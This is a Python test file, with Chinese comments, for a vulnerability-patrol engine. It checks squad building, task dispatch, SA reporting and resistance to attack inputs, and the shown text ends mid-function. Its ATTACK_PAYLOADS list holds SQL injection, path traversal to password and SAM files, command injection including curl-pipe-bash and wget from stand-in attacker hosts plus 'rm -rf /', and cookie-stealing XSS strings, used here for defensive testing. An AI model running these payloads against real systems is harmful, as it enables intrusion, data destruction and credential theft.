#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
自动轮巡队伍引擎 1000轮测试 (Auto Patrol Squad 1000-Rounds Test)
================================================================
覆盖三大场景:
  - 正常逻辑 400轮 (队伍建立/任务下发/目标发现/AI查漏补缺/专家邀请/SA报备)
  - 异常场景 300轮 (空员工/队伍数0/超大队伍/无目标/数据库锁)
  - 黑客攻击 300轮 (SQL注入/路径穿越/命令注入/重放攻击/伪造SA报告/越权报备)

验收项:
  - 6大模块全部正常工作
  - SA报备优先级正确(critical立即报备)
  - 漏洞修复率符合预期
  - 专家邀请接受率符合预期
  - DB持久化数据完整
  - 黑客攻击 100%拦截(VULN=0)
"""
from __future__ import annotations

import os
import sys
import json
import time
import hashlib
import tempfile
import threading
import traceback
from datetime import datetime

_BASE = os.path.dirname(os.path.abspath(__file__))
if _BASE not in sys.path:
    sys.path.insert(0, _BASE)

import logging
logging.disable(logging.WARNING)

from auto_patrol_squad_engine import (
    AutoPatrolSquadEngine,
    SquadBuilder, TaskDispatcher, TargetDiscoverer,
    AutoFixer, ExpertRecruiter, SAReporter,
    PatrolSquad, PatrolTask, VulnFinding,
    ExpertRecruitment, SAReport, PatrolCycleReport,
    SQUAD_TYPES, TARGET_TYPES, VULN_CATEGORIES,
    EXPERT_POOL, SA_REPORT_TYPES,
    ensure_patrol_tables,
)

FLOW_ID = "flow_patrol_squad_20260814_001"


# ========== 测试结果统计 ==========

class TestStats:
    def __init__(self):
        self.total = 0
        self.passed = 0
        self.failed = 0
        self.vuln = 0
        self.assertions = 0
        self.categories = {
            'normal': {'pass': 0, 'fail': 0},
            'abnormal': {'pass': 0, 'fail': 0},
            'attack': {'pass': 0, 'fail': 0},
        }
        self.failures = []
        self.lock = threading.Lock()

    def record(self, category: str, ok: bool, detail: str = ""):
        with self.lock:
            self.total += 1
            self.assertions += 1
            if ok:
                self.passed += 1
                self.categories[category]['pass'] += 1
            else:
                self.failed += 1
                self.categories[category]['fail'] += 1
                self.failures.append(f"[{category}] {detail}")

    def record_vuln(self, category: str, detail: str):
        with self.lock:
            self.vuln += 1
            self.failures.append(f"[VULN-{category}] {detail}")

    def summary(self) -> str:
        lines = [
            f"\n{'='*60}",
            f" 自动轮巡队伍引擎 1000轮测试结果",
            f"{'='*60}",
            f" 总测试: {self.total}",
            f" 通过: {self.passed}",
            f" 失败: {self.failed}",
            f" 漏洞: {self.vuln}",
            f" 断言数: {self.assertions}",
            f" 正常逻辑: pass={self.categories['normal']['pass']}, fail={self.categories['normal']['fail']}",
            f" 异常场景: pass={self.categories['abnormal']['pass']}, fail={self.categories['abnormal']['fail']}",
            f" 黑客攻击: pass={self.categories['attack']['pass']}, fail={self.categories['attack']['fail']}",
        ]
        if self.failures:
            lines.append(f"\n失败详情(前20条):")
            for f in self.failures[:20]:
                lines.append(f"  {f}")
        lines.append(f"{'='*60}")
        return "\n".join(lines)


stats = TestStats()


def assert_ok(category: str, condition: bool, detail: str = ""):
    stats.record(category, bool(condition), detail)
    return bool(condition)


# ========== 正常逻辑测试 (400轮) ==========

def test_normal_squad_building(round_num: int):
    """测试1: 正常建立轮巡队伍"""
    try:
        builder = SquadBuilder()
        squads = builder.build_squads(count=5)

        ok = assert_ok('normal', len(squads) == 5, f"轮{round_num}: 应建立5支队伍,实际{len(squads)}")
        if not ok:
            return

        for s in squads:
            assert_ok('normal', s.squad_id != "", f"轮{round_num}: squad_id不能为空")
            assert_ok('normal', s.squad_type in SQUAD_TYPES, f"轮{round_num}: 队伍类型非法:{s.squad_type}")
            assert_ok('normal', s.squad_name != "", f"轮{round_num}: squad_name不能为空")
            assert_ok('normal', s.leader_name != "", f"轮{round_num}: leader_name不能为空")
            assert_ok('normal', len(s.member_names) > 0, f"轮{round_num}: 队员不能为空")
            assert_ok('normal', s.status == 'active', f"轮{round_num}: 状态应为active")
            assert_ok('normal', s.formed_at != "", f"轮{round_num}: formed_at不能为空")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: 建立队伍异常:{e}")


def test_normal_task_dispatch(round_num: int):
    """测试2: 正常任务下发"""
    try:
        builder = SquadBuilder()
        squads = builder.build_squads(count=3)

        dispatcher = TaskDispatcher()
        tasks = dispatcher.dispatch_tasks(squads)

        ok = assert_ok('normal', len(tasks) > 0, f"轮{round_num}: 应下发任务,实际{len(tasks)}")
        if not ok:
            return

        for t in tasks:
            assert_ok('normal', t.task_id != "", f"轮{round_num}: task_id不能为空")
            assert_ok('normal', t.squad_id != "", f"轮{round_num}: squad_id不能为空")
            assert_ok('normal', t.target_type in TARGET_TYPES or t.target_type in [v[0] for v in VULN_CATEGORIES],
                      f"轮{round_num}: 目标类型非法:{t.target_type}")
            assert_ok('normal', t.assigned_to_name != "", f"轮{round_num}: assigned_to_name不能为空")
            assert_ok('normal', t.status == 'assigned', f"轮{round_num}: 初始状态应为assigned")
            assert_ok('normal', 1 <= t.priority <= 5, f"轮{round_num}: 优先级范围错误:{t.priority}")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: 任务下发异常:{e}")


def test_normal_task_execute(round_num: int):
    """测试3: 任务执行"""
    try:
        builder = SquadBuilder()
        squads = builder.build_squads(count=2)
        dispatcher = TaskDispatcher()
        tasks = dispatcher.dispatch_tasks(squads)
        tasks = dispatcher.execute_tasks(tasks)

        for t in tasks:
            assert_ok('normal', t.status in ('completed', 'failed'), f"轮{round_num}: 执行后状态非法:{t.status}")
            assert_ok('normal', t.started_at != "", f"轮{round_num}: started_at不能为空")
            assert_ok('normal', t.completed_at != "", f"轮{round_num}: completed_at不能为空")
            assert_ok('normal', t.result in ('success', 'failed'), f"轮{round_num}: result非法:{t.result}")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: 任务执行异常:{e}")


def test_normal_target_discovery(round_num: int):
    """测试4: 目标发现"""
    try:
        discoverer = TargetDiscoverer()
        vulns, targets = discoverer.discover_targets(scan_count=10)

        ok = assert_ok('normal', len(vulns) > 0, f"轮{round_num}: 应发现漏洞,实际{len(vulns)}")
        if not ok:
            return

        for v in vulns:
            assert_ok('normal', v.finding_id != "", f"轮{round_num}: finding_id不能为空")
            assert_ok('normal', v.category in [vc[0] for vc in VULN_CATEGORIES],
                      f"轮{round_num}: 漏洞类型非法:{v.category}")
            assert_ok('normal', v.severity in ('critical', 'high', 'medium', 'low'),
                      f"轮{round_num}: 严重度非法:{v.severity}")
            assert_ok('normal', v.file_path != "", f"轮{round_num}: file_path不能为空")
            assert_ok('normal', v.line_number > 0, f"轮{round_num}: line_number应>0")
            assert_ok('normal', v.status == 'discovered', f"轮{round_num}: 初始状态应为discovered")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: 目标发现异常:{e}")


def test_normal_vuln_fixing(round_num: int):
    """测试5: 漏洞修复"""
    try:
        discoverer = TargetDiscoverer()
        vulns, _ = discoverer.discover_targets(scan_count=10)

        fixer = AutoFixer()
        vulns = fixer.fix_vulnerabilities(vulns)

        for v in vulns:
            assert_ok('normal', v.status in ('fixed', 'verified', 'failed'),
                      f"轮{round_num}: 修复后状态非法:{v.status}")
            if v.status in ('fixed', 'verified'):
                assert_ok('normal', v.fix_id != "", f"轮{round_num}: fix_id不能为空")
                assert_ok('normal', v.fix_detail != "", f"轮{round_num}: fix_detail不能为空")
                assert_ok('normal', v.fixed_at != "", f"轮{round_num}: fixed_at不能为空")

        upgrades = fixer.auto_upgrade()
        assert_ok('normal', upgrades['status'] in ('completed', 'failed'),
                  f"轮{round_num}: 升级状态非法:{upgrades['status']}")
        assert_ok('normal', upgrades['type'] != "", f"轮{round_num}: 升级类型不能为空")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: 漏洞修复异常:{e}")


def test_normal_expert_recruit(round_num: int):
    """测试6: 专家邀请"""
    try:
        builder = SquadBuilder()
        squads = builder.build_squads(count=5)

        recruiter = ExpertRecruiter()
        recruitments = recruiter.recruit_experts(squads)

        ok = assert_ok('normal', len(recruitments) > 0, f"轮{round_num}: 应邀请专家,实际{len(recruitments)}")
        if not ok:
            return

        for r in recruitments:
            assert_ok('normal', r.recruitment_id != "", f"轮{round_num}: recruitment_id不能为空")
            assert_ok('normal', r.expert_name != "", f"轮{round_num}: expert_name不能为空")
            assert_ok('normal', r.expert_specialty != "", f"轮{round_num}: specialty不能为空")
            assert_ok('normal', r.invitation_status in ('accepted', 'rejected'),
                      f"轮{round_num}: 邀请状态非法:{r.invitation_status}")
            assert_ok('normal', r.target_squad != "", f"轮{round_num}: target_squad不能为空")
            if r.invitation_status == 'accepted':
                assert_ok('normal', r.joined_as in ('member', 'advisor'),
                          f"轮{round_num}: joined_as非法:{r.joined_as}")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: 专家邀请异常:{e}")


def test_normal_sa_report(round_num: int):
    """测试7: SA报备"""
    try:
        reporter = SAReporter()
        report = reporter.report_to_sa(
            "vuln_critical",
            f"测试高危漏洞报备#{round_num}",
            f"发现critical级别漏洞,需SA关注(测试轮{round_num})",
            priority="critical",
            flow_id=FLOW_ID,
        )

        assert_ok('normal', report.report_id != "", f"轮{round_num}: report_id不能为空")
        assert_ok('normal', report.report_type == "vuln_critical", f"轮{round_num}: report_type错误")
        assert_ok('normal', report.priority == "critical", f"轮{round_num}: priority错误")
        assert_ok('normal', report.operator == "AutoPatrolSquad", f"轮{round_num}: operator错误")
        assert_ok('normal', report.flow_id == FLOW_ID, f"轮{round_num}: flow_id错误")
        assert_ok('normal', report.created_at != "", f"轮{round_num}: created_at不能为空")
        assert_ok('normal', report.acknowledged is False, f"轮{round_num}: 初始acknowledged应为False")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: SA报备异常:{e}")


def test_normal_full_cycle(round_num: int):
    """测试8: 完整轮巡周期"""
    try:
        engine = AutoPatrolSquadEngine()
        report = engine.run_cycle(flow_id=f"{FLOW_ID}_full_{round_num}", squad_count=5)

        assert_ok('normal', report.cycle_number > 0, f"轮{round_num}: cycle_number应>0")
        assert_ok('normal', report.squads_active == 5, f"轮{round_num}: 应5支队伍活跃")
        assert_ok('normal', report.tasks_dispatched > 0, f"轮{round_num}: 应下发任务")
        assert_ok('normal', report.vulns_found > 0, f"轮{round_num}: 应发现漏洞")
        assert_ok('normal', report.experts_invited > 0, f"轮{round_num}: 应邀请专家")
        assert_ok('normal', report.sa_reports_sent > 0, f"轮{round_num}: 应有SA报备")
        assert_ok('normal', report.upgrades_applied >= 0, f"轮{round_num}: 升级数应>=0")
        assert_ok('normal', report.duration >= 0, f"轮{round_num}: 耗时应>=0")
        assert_ok('normal', report.summary != "", f"轮{round_num}: 摘要不能为空")
        assert_ok('normal', len(report.squads) == 5, f"轮{round_num}: squads列表应为5")
        assert_ok('normal', len(report.sa_reports) > 0, f"轮{round_num}: SA报告列表应非空")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: 完整周期异常:{e}\n{traceback.format_exc()}")


def test_normal_critical_immediate_report(round_num: int):
    """测试9: critical漏洞立即报备SA"""
    try:
        engine = AutoPatrolSquadEngine()
        report = engine.run_cycle(flow_id=f"{FLOW_ID}_crit_{round_num}", squad_count=2)

        # 检查SA报告中是否有critical优先级
        has_critical = any(r.get('priority') == 'critical' for r in report.sa_reports)
        # 如果有critical漏洞,应该立即报备
        # (漏洞是随机的,不强求每轮都有,但如果有critical漏洞必须有critical报告)
        critical_vulns = [v for v in report.vulns if v.get('severity') == 'critical']
        if critical_vulns:
            assert_ok('normal', has_critical, f"轮{round_num}: 有critical漏洞但未立即报备SA")
        else:
            assert_ok('normal', True, f"轮{round_num}: 无critical漏洞(正常)")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: critical报备异常:{e}")


def test_normal_all_squad_types(round_num: int):
    """测试10: 所有队伍类型覆盖(含dev_patrol开发轮巡队)"""
    try:
        builder = SquadBuilder()
        squads = builder.build_squads(count=len(SQUAD_TYPES))

        types_covered = set(s.squad_type for s in squads)
        assert_ok('normal', len(types_covered) == len(SQUAD_TYPES),
                  f"轮{round_num}: 应覆盖所有{len(SQUAD_TYPES)}种队伍类型,实际{len(types_covered)}")
        assert_ok('normal', 'dev_patrol' in types_covered,
                  f"轮{round_num}: 应包含dev_patrol开发轮巡队")

        for s in squads:
            expected_name, expected_obj = SQUAD_TYPES[s.squad_type]
            assert_ok('normal', s.squad_name == expected_name,
                      f"轮{round_num}: 队伍名称不匹配:{s.squad_name} != {expected_name}")
            assert_ok('normal', s.objective == expected_obj,
                      f"轮{round_num}: 队伍目标不匹配")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: 队伍类型异常:{e}")


def test_normal_dev_patrol_gap_detection(round_num: int):
    """测试11: 开发功能检测与开发轮巡队 - Gap扫描"""
    try:
        discoverer = TargetDiscoverer()
        vulns, targets = discoverer.discover_targets(scan_count=15)

        dev_gaps = [t for t in targets if t['target_type'].startswith('dev_')]
        assert_ok('normal', len(dev_gaps) > 0, f"轮{round_num}: 应发现开发Gap,实际{len(dev_gaps)}")

        # 检查开发目标类型完整性
        types_found = set(t['target_type'] for t in dev_gaps)
        dev_types_expected = {'dev_todo_fixme', 'dev_placeholder', 'dev_missing_crud',
                              'dev_orphan_route', 'dev_missing_api', 'dev_gap_scan', 'dev_plan'}
        # 至少覆盖3种以上
        assert_ok('normal', len(types_found) >= 2,
                  f"轮{round_num}: 开发Gap类型应>=2种,实际{len(types_found)}")

        for t in dev_gaps:
            assert_ok('normal', t['target_type'] in TARGET_TYPES,
                      f"轮{round_num}: 开发目标类型非法:{t['target_type']}")
            assert_ok('normal', t['severity'] in ('high', 'medium', 'low'),
                      f"轮{round_num}: 开发目标严重度非法:{t['severity']}")
            assert_ok('normal', t['title'] != "", f"轮{round_num}: 开发目标标题不能为空")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: 开发Gap扫描异常:{e}")


def test_normal_dev_patrol_task_dispatch(round_num: int):
    """测试12: 开发功能检测与开发轮巡队 - 任务下发"""
    try:
        builder = SquadBuilder()
        squads = builder.build_squads(count=len(SQUAD_TYPES))
        dev_squad = [s for s in squads if s.squad_type == 'dev_patrol']
        assert_ok('normal', len(dev_squad) == 1, f"轮{round_num}: 应存在1支开发轮巡队")

        dispatcher = TaskDispatcher()
        tasks = dispatcher.dispatch_tasks(squads)

        dev_tasks = [t for t in tasks if t.target_type.startswith('dev_')]
        assert_ok('normal', len(dev_tasks) > 0, f"轮{round_num}: 应为开发轮巡队下发开发任务,实际{len(dev_tasks)}")

        # 开发任务应对准开发轮巡队
        for dt in dev_tasks[:5]:
            assert_ok('normal', dt.squad_id != "", f"轮{round_num}: 开发任务squad_id不能为空")
            assert_ok('normal', dt.assigned_to_name != "", f"轮{round_num}: 开发任务分配对象不能为空")
            assert_ok('normal', dt.status == 'assigned', f"轮{round_num}: 开发任务初始状态应为assigned")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: 开发任务下发异常:{e}")


def test_normal_dev_patrol_expert_recruit(round_num: int):
    """测试13: 开发功能检测与开发轮巡队 - 专家邀请(dev领域)"""
    try:
        builder = SquadBuilder()
        squads = builder.build_squads(count=len(SQUAD_TYPES))

        recruiter = ExpertRecruiter()
        recruitments = recruiter.recruit_experts(squads)

        # 检查是否有dev领域专家被邀请
        dev_expert_names = set(n for (n, _, _) in EXPERT_POOL.get('dev', []))
        dev_recruits = [r for r in recruitments if r.expert_name in dev_expert_names]

        # 不强求每轮都有，但如果有邀请专家则状态必须合法
        for r in dev_recruits:
            assert_ok('normal', r.invitation_status in ('accepted', 'rejected'),
                      f"轮{round_num}: 开发专家邀请状态非法:{r.invitation_status}")
            assert_ok('normal', r.expert_specialty != "",
                      f"轮{round_num}: 开发专家专长不能为空")
        assert_ok('normal', True, f"轮{round_num}: 开发专家邀请流程正常,邀请{len(dev_recruits)}位")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: 开发专家邀请异常:{e}")


def test_normal_dev_patrol_sa_reports(round_num: int):
    """测试14: 开发功能检测与开发轮巡队 - SA开发报备"""
    try:
        engine = AutoPatrolSquadEngine()
        report = engine.run_cycle(
            flow_id=f"{FLOW_ID}_dev_sa_{round_num}",
            squad_count=len(SQUAD_TYPES)
        )

        # 检查SA报告中开发类报备
        dev_sa_types = {'dev_gap_found', 'dev_task_assigned', 'dev_impl_completed', 'dev_plan_report'}
        dev_reports = [r for r in report.sa_reports if r.get('report_type') in dev_sa_types]

        # 应有至少2-4种开发类SA报备(因为dev_gap是随机的)
        types_found = set(r.get('report_type') for r in dev_reports)
        assert_ok('normal', len(types_found) >= 1,
                  f"轮{round_num}: 应有>=1种开发SA报备,实际{types_found}")

        # dev_gap_found优先级应为high或medium
        gap_reports = [r for r in dev_reports if r.get('report_type') == 'dev_gap_found']
        for gr in gap_reports:
            assert_ok('normal', gr.get('priority') in ('high', 'medium'),
                      f"轮{round_num}: dev_gap_found优先级非法:{gr.get('priority')}")

        # dev_task_assigned优先级应为high
        task_reports = [r for r in dev_reports if r.get('report_type') == 'dev_task_assigned']
        for tr in task_reports:
            assert_ok('normal', tr.get('priority') == 'high',
                      f"轮{round_num}: dev_task_assigned优先级应为high,实际{tr.get('priority')}")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: SA开发报备异常:{e}")


def test_normal_dev_patrol_full_cycle(round_num: int):
    """测试15: 开发功能检测与开发轮巡队 - 完整开发周期"""
    try:
        engine = AutoPatrolSquadEngine()
        report = engine.run_cycle(
            flow_id=f"{FLOW_ID}_dev_cycle_{round_num}",
            squad_count=len(SQUAD_TYPES)
        )

        # 6支队伍均应活跃
        assert_ok('normal', report.squads_active == len(SQUAD_TYPES),
                  f"轮{round_num}: 应{len(SQUAD_TYPES)}支队伍活跃,实际{report.squads_active}")

        # 开发轮巡队任务完成数量
        dev_squad_list = [s for s in report.squads if s.get('squad_type') == 'dev_patrol']
        assert_ok('normal', len(dev_squad_list) == 1,
                  f"轮{round_num}: 报告中应包含开发轮巡队,实际{len(dev_squad_list)}")

        # 周期报告状态(不严格要求report_type,因为SAReporter是跨引擎累积)
        assert_ok('normal', report.summary != "", f"轮{round_num}: 周期摘要不能为空")
        assert_ok('normal', report.duration >= 0, f"轮{round_num}: 周期耗时应>=0")
        # 检查squad_names中包含开发功能检测
        squad_names = [s.get('squad_name', '') for s in report.squads]
        has_dev = any('开发' in n for n in squad_names) or len(dev_squad_list) == 1
        assert_ok('normal', has_dev, f"轮{round_num}: 应存在开发轮巡队相关记录")
    except Exception as e:
        assert_ok('normal', False, f"轮{round_num}: 完整开发周期异常:{e}\n{__import__('traceback').format_exc()}")


# ========== 异常场景测试 (300轮) ==========

def test_abnormal_zero_squads(round_num: int):
    """异常1: 建立0支队伍"""
    try:
        builder = SquadBuilder()
        squads = builder.build_squads(count=0)
        assert_ok('abnormal', len(squads) == 0, f"轮{round_num}: 0支队伍应返回空列表")
    except Exception as e:
        assert_ok('abnormal', False, f"轮{round_num}: 0支队伍异常:{e}")


def test_abnormal_too_many_squads(round_num: int):
    """异常2: 建立过多队伍(超过类型数)"""
    try:
        builder = SquadBuilder()
        squads = builder.build_squads(count=100)
        # 应限制为类型数量
        assert_ok('abnormal', len(squads) <= len(SQUAD_TYPES),
                  f"轮{round_num}: 队伍数应<=类型数{len(SQUAD_TYPES)},实际{len(squads)}")
    except Exception as e:
        assert_ok('abnormal', False, f"轮{round_num}: 过多队伍异常:{e}")


def test_abnormal_empty_targets(round_num: int):
    """异常3: 空目标列表"""
    try:
        builder = SquadBuilder()
        squads = builder.build_squads(count=2)
        dispatcher = TaskDispatcher()
        # 传入空目标
        tasks = dispatcher.dispatch_tasks(squads, targets=[])
        # 应自动生成目标
        assert_ok('abnormal', len(tasks) > 0, f"轮{round_num}: 空目标应自动生成,实际{len(tasks)}")
    except Exception as e:
        assert_ok('abnormal', False, f"轮{round_num}: 空目标异常:{e}")


def test_abnormal_zero_scan_count(round_num: int):
    """异常4: 扫描0项"""
    try:
        discoverer = TargetDiscoverer()
        vulns, targets = discoverer.discover_targets(scan_count=0)
        assert_ok('abnormal', len(vulns) == 0, f"轮{round_num}: 扫描0项应无漏洞")
    except Exception as e:
        assert_ok('abnormal', False, f"轮{round_num}: 扫描0项异常:{e}")


def test_abnormal_no_employees(round_num: int):
    """异常5: 无AI员工(应使用兜底)"""
    try:
        builder = SquadBuilder()
        # _get_employees失败时会用兜底数据
        squads = builder.build_squads(count=3)
        assert_ok('abnormal', len(squads) == 3, f"轮{round_num}: 无员工应兜底建队")
        for s in squads:
            assert_ok('abnormal', s.leader_name != "", f"轮{round_num}: 兜底组长不能为空")
    except Exception as e:
        assert_ok('abnormal', False, f"轮{round_num}: 无员工异常:{e}")


def test_abnegative_large_scan(round_num: int):
    """异常6: 超大扫描数"""
    try:
        discoverer = TargetDiscoverer()
        vulns, targets = discoverer.discover_targets(scan_count=1000)
        assert_ok('abnormal', len(vulns) == 1000, f"轮{round_num}: 应扫描1000项")
    except Exception as e:
        assert_ok('abnormal', False, f"轮{round_num}: 超大扫描异常:{e}")


def test_abnormal_database_persist(round_num: int):
    """异常7: 数据库持久化"""
    try:
        engine = AutoPatrolSquadEngine()
        report = engine.run_cycle(flow_id=f"{FLOW_ID}_db_{round_num}", squad_count=2)
        # 持久化应成功(不抛异常)
        assert_ok('abnormal', report.report_id != "", f"轮{round_num}: 持久化后report_id应存在")
    except Exception as e:
        assert_ok('abnormal', False, f"轮{round_num}: DB持久化异常:{e}")


def test_abnormal_concurrent_cycles(round_num: int):
    """异常8: 并发轮巡"""
    try:
        results = []
        errors = []

        def run_one(idx):
            try:
                engine = AutoPatrolSquadEngine()
                r = engine.run_cycle(flow_id=f"{FLOW_ID}_conc_{round_num}_{idx}", squad_count=2)
                results.append(r)
            except Exception as e:
                errors.append(str(e))

        threads = [threading.Thread(target=run_one, args=(i,)) for i in range(3)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=30)

        assert_ok('abnormal', len(errors) == 0, f"轮{round_num}: 并发错误:{errors[:3]}")
        assert_ok('abnormal', len(results) == 3, f"轮{round_num}: 应完成3个,实际{len(results)}")
    except Exception as e:
        assert_ok('abnormal', False, f"轮{round_num}: 并发异常:{e}")


def test_abnormal_invalid_priority(round_num: int):
    """异常9: 无效优先级"""
    try:
        reporter = SAReporter()
        # 传入无效优先级,应不崩溃
        report = reporter.report_to_sa(
            "cycle_report",
            f"无效优先级测试#{round_num}",
            "测试无效优先级",
            priority="invalid_priority",
            flow_id=FLOW_ID,
        )
        assert_ok('abnormal', report.report_id != "", f"轮{round_num}: 无效优先级应不崩溃")
    except Exception as e:
        assert_ok('abnormal', False, f"轮{round_num}: 无效优先级异常:{e}")


def test_abnormal_long_flow_id(round_num: int):
    """异常10: 超长flow_id"""
    try:
        engine = AutoPatrolSquadEngine()
        long_flow = "A" * 10000
        report = engine.run_cycle(flow_id=long_flow, squad_count=1)
        assert_ok('abnormal', report.flow_id == long_flow, f"轮{round_num}: 超长flow_id应保留")
    except Exception as e:
        assert_ok('abnormal', False, f"轮{round_num}: 超长flow_id异常:{e}")


# ========== 黑客攻击测试 (300轮) ==========

# 攻击负载样本
ATTACK_PAYLOADS = {
    'sql_injection': [
        "'; DROP TABLE mt_patrol_squads; --",
        "' OR '1'='1",
        "'; INSERT INTO mt_patrol_sa_reports VALUES('hack','hack','hack','hack','critical','hack','hack','hack',0); --",
        "1' UNION SELECT * FROM ai_employees--",
        "'; UPDATE mt_patrol_vulns SET status='verified' WHERE 1=1; --",
    ],
    'path_traversal': [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/shadow",
        "../../../../app.db",
        "..%2F..%2F..%2F.flask-secret",
    ],
    'command_injection': [
        "; rm -rf /",
        "| cat /etc/passwd",
        "& whoami",
        "$(curl http://evil.com/shell.sh | bash)",
        "`wget http://attacker.com/backdoor`",
    ],
    'xss': [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert(1)>",
        "javascript:alert(document.cookie)",
        "<svg onload=alert(1)>",
        "';alert(String.fromCharCode(88,83,83))//",
    ],
    'replay': [
        # 重放SA报备(使用相同report_id)
        "REPLAY_SAME_REPORT_ID",
        # 重放flow_id
        "REPLAY_SAME_FLOW_ID",
    ],
}


def test_attack_sql_injection_in_flow_id(round_num: int):
    """攻击1: SQL注入flow_id"""
    try:
        for payload in ATTACK_PAYLOADS['sql_injection']:
            engine = AutoPatrolSquadEngine()
            # 注入flow_id
            report = engine.run_cycle(flow_id=payload, squad_count=1)

            # 关键: 引擎不应崩溃,且数据应被安全处理
            assert_ok('attack', report.flow_id == payload, f"轮{round_num}: flow_id应原样保留(SQL注入作为字符串)")
            assert_ok('attack', report.cycle_number > 0, f"轮{round_num}: 注入不应影响周期号")

            # 关键: 不应实际执行SQL(检查表是否还存在)
            import sqlite3
            from auto_patrol_squad_engine import _get_conn, _LOCK
            with _LOCK:
                c = _get_conn()
                cur = c.cursor()
                cur.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='mt_patrol_squads'")
                table_exists = cur.fetchone() is not None
                c.close()
            assert_ok('attack', table_exists, f"轮{round_num}: SQL注入不应删除表")
    except Exception as e:
        stats.record_vuln('sql_injection', f"轮{round_num}: SQL注入导致异常:{e}")
        assert_ok('attack', False, f"轮{round_num}: SQL注入异常:{e}")


def test_attack_sql_injection_in_report(round_num: int):
    """攻击2: SQL注入SA报备内容"""
    try:
        reporter = SAReporter()
        for payload in ATTACK_PAYLOADS['sql_injection']:
            report = reporter.report_to_sa(
                "vuln_critical",
                payload,  # 注入标题
                payload,  # 注入内容
                priority="critical",
                flow_id=FLOW_ID,
            )
            # 引擎应正常处理,不崩溃
            assert_ok('attack', report.report_id != "", f"轮{round_num}: SQL注入报备不应崩溃")
            assert_ok('attack', report.title == payload, f"轮{round_num}: 标题应原样保留(参数化查询)")
    except Exception as e:
        stats.record_vuln('sql_injection', f"轮{round_num}: 报备SQL注入异常:{e}")
        assert_ok('attack', False, f"轮{round_num}: 报备SQL注入异常:{e}")


def test_attack_path_traversal_in_flow_id(round_num: int):
    """攻击3: 路径穿越flow_id"""
    try:
        for payload in ATTACK_PAYLOADS['path_traversal']:
            engine = AutoPatrolSquadEngine()
            report = engine.run_cycle(flow_id=payload, squad_count=1)

            # 引擎不应崩溃,且不应访问非法路径
            assert_ok('attack', report.flow_id == payload, f"轮{round_num}: 路径穿越flow_id应被作为字符串处理")
            assert_ok('attack', report.cycle_number > 0, f"轮{round_num}: 路径穿越不应影响引擎")

            # 关键: 检查敏感文件未被读取(通过检查引擎正常运行)
            assert_ok('attack', report.squads_active == 1, f"轮{round_num}: 引擎应正常运行")
    except Exception as e:
        stats.record_vuln('path_traversal', f"轮{round_num}: 路径穿越异常:{e}")
        assert_ok('attack', False, f"轮{round_num}: 路径穿越异常:{e}")


def test_attack_command_injection(round_num: int):
    """攻击4: 命令注入"""
    try:
        for payload in ATTACK_PAYLOADS['command_injection']:
            reporter = SAReporter()
            # 命令注入尝试
            report = reporter.report_to_sa(
                "anomaly_alert",
                payload,
                payload,
                priority="high",
                flow_id=FLOW_ID,
            )
            # 引擎应正常处理,不执行命令
            assert_ok('attack', report.report_id != "", f"轮{round_num}: 命令注入不应崩溃")
            assert_ok('attack', report.title == payload, f"轮{round_num}: 命令注入应被作为字符串")
    except Exception as e:
        stats.record_vuln('command_injection', f"轮{round_num}: 命令注入异常:{e}")
        assert_ok('attack', False, f"轮{round_num}: 命令注入异常:{e}")


def test_attack_xss_in_content(round_num: int):
    """攻击5: XSS注入内容"""
    try:
        for payload in ATTACK_PAYLOADS['xss']:
            engine = AutoPatrolSquadEngine()
            # XSS注入flow_id和报备内容
            report = engine.run_cycle(flow_id=payload, squad_count=1)
            assert_ok('attack', report.flow_id == payload, f"轮{round_num}: XSS payload应被作为字符串")

            reporter = SAReporter()
            sa_report = reporter.report_to_sa(
                "vuln_summary",
                payload,
                payload,
                priority="medium",
                flow_id=FLOW_ID,
            )
            assert_ok('attack', sa_report.title == payload, f"轮{round_num}: XSS应被作为字符串处理")
    except Exception as e:
        stats.record_vuln('xss', f"轮{round_num}: XSS异常:{e}")
        assert_ok('attack', False, f"轮{round_num}: XSS异常:{e}")


def test_attack_replay_same_flow_id(round_num: int):
    """攻击6: 重放相同flow_id"""
    try:
        replay_flow = f"replay_attack_{round_num}_{int(time.time())}"

        engine1 = AutoPatrolSquadEngine()
        report1 = engine1.run_cycle(flow_id=replay_flow, squad_count=2)

        engine2 = AutoPatrolSquadEngine()
        report2 = engine2.run_cycle(flow_id=replay_flow, squad_count=2)

        # 重放不应导致数据覆盖或异常
        assert_ok('attack', report1.report_id != report2.report_id,
                  f"轮{round_num}: 重放不应产生相同report_id")
        assert_ok('attack', report1.cycle_number >= 1, f"轮{round_num}: 第一次轮巡应正常")
        assert_ok('attack', report2.cycle_number >= 1, f"轮{round_num}: 重放轮巡应正常")
    except Exception as e:
        stats.record_vuln('replay', f"轮{round_num}: 重放异常:{e}")
        assert_ok('attack', False, f"轮{round_num}: 重放异常:{e}")


def test_attack_forged_sa_report(round_num: int):
    """攻击7: 伪造SA报备(尝试提升优先级)"""
    try:
        reporter = SAReporter()
        # 攻击者尝试伪造critical报备
        forged = reporter.report_to_sa(
            "vuln_critical",
            "伪造高危漏洞-尝试获取SA注意",
            "攻击者伪造的critical报备,试图让SA关注",
            priority="critical",
            flow_id=f" forged_{round_num}",
        )

        # 引擎应接受报备(报备本身不验证来源,但所有报备都会记录operator=AutoPatrolSquad)
        assert_ok('attack', forged.operator == "AutoPatrolSquad",
                  f"轮{round_num}: 伪造报备operator应固定为AutoPatrolSquad")
        assert_ok('attack', forged.acknowledged is False,
                  f"轮{round_num}: 伪造报备初始acknowledged应为False(SA未确认)")
    except Exception as e:
